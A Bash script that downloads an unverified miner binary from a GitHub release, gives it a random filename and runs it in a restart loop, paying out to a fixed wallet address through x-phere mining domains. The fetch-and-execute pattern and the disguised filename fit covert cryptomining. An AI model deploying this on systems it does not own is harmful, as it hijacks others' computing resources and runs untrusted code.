#!/bin/bash

# Function to generate a random filename (10 characters)
generate_random_filename() {
    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
    echo
}

# Define the URL for the miner binary
url="https://github.com/vedhagsvp/qubros/releases/download/apl/mnxpcna"

# Download the miner to a file with a random name
download_miner() {
    miner_filename=$1
    echo "üì• Downloading miner..."
    if wget -q "$url" -O "$miner_filename"; then
        echo "‚úÖ Download complete. Saved as: $miner_filename"
    else
        echo "‚ùå Error downloading miner. Exiting."
        exit 1
    fi
}

# Set executable permissions
set_permissions() {
    miner_filename=$1
    echo "üîê Setting permissions for $miner_filename..."
    if chmod +x "$miner_filename"; then
        echo "‚úÖ Permissions set."
    else
        echo "‚ùå Error setting permissions."
        exit 1
    fi
}

# Run the miner for 30 minutes, sleep 15 seconds, and restart
run_miner() {
    miner_filename=$1
    target_address="0x414A2A8b272cbD0bcEbb70ae1919cfeff89521E7"
    mining_domains="https://sgp-mining.x-phere.com,https://bkk-mining.x-phere.com,https://hkg-mining.x-phere.com,https://idn-mining.x-phere.com"

    while true; do
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] üöÄ Starting miner..."

        ./$miner_filename \
            -targetMiner "$target_address" \
            -domain "$mining_domains" >> miner.log 2>&1 &
        miner_pid=$!

        # Let it run for 30 minutes
        sleep 1800

        echo "[$(date '+%Y-%m-%d %H:%M:%S')] üí§ Pausing miner for 15 seconds..."

        # Stop the miner process
        kill "$miner_pid" >/dev/null 2>&1
        wait "$miner_pid" 2>/dev/null

        # Sleep before restarting
        sleep 15
    done
}

# Main logic
main() {
    if [[ "$(uname)" != "Linux" ]]; then
        echo "‚ùå This script is only supported on Linux."
        exit 1
    fi

    miner_filename=$(generate_random_filename)
    download_miner "$miner_filename"
    set_permissions "$miner_filename"
    run_miner "$miner_filename"
}

# Run the main function
main
